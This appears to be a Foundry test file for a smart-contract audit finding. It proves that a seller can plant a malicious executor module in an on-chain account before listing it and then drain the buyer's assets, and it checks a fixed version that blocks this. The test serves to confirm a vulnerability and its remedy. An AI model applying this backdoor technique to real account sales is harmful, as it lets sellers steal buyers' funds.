// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, Asset, OnChainLabFixed, MaliciousExecutor} from
    "./65951-onchainlabexecutefromexecutor-pre-listing-module-backdoor-by.sol";

contract Finding65951Test is Test {
    function test_exploit_prelisting_executor_drains_buyer() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.asset().balanceOf(address(e)), 5 ether, "seller took 5");
        assertEq(e.asset().balanceOf(address(e.ocl())), 0, "account empty");
        assertEq(e.stateAfterDrain(), e.listedState(), "state never moved");
        assertEq(e.ocl().nftOwner(), e.BUYER(), "buyer owns the nft");
    }

    function test_control_executor_dies_when_owner_changes() public {
        Asset asset = new Asset();
        MaliciousExecutor executor = new MaliciousExecutor();
        OnChainLabFixed ocl = new OnChainLabFixed(asset, address(this));
        uint256 before = ocl.state();
        asset.mint(address(ocl), 5 ether);
        ocl.installModule(ocl.MODULE_TYPE_EXECUTOR(), address(executor), bytes(""));
        assertEq(ocl.state(), before + 1, "install bumps state");
        ocl.transferNft(address(uint160(0xB00)));
        vm.expectRevert(bytes("owner changed"));
        executor.sudoDoExecFixed(ocl, address(this), 5 ether);
        assertEq(asset.balanceOf(address(ocl)), 5 ether, "buyer keeps the assets");
        assertEq(asset.balanceOf(address(this)), 0, "seller got nothing");
    }
}
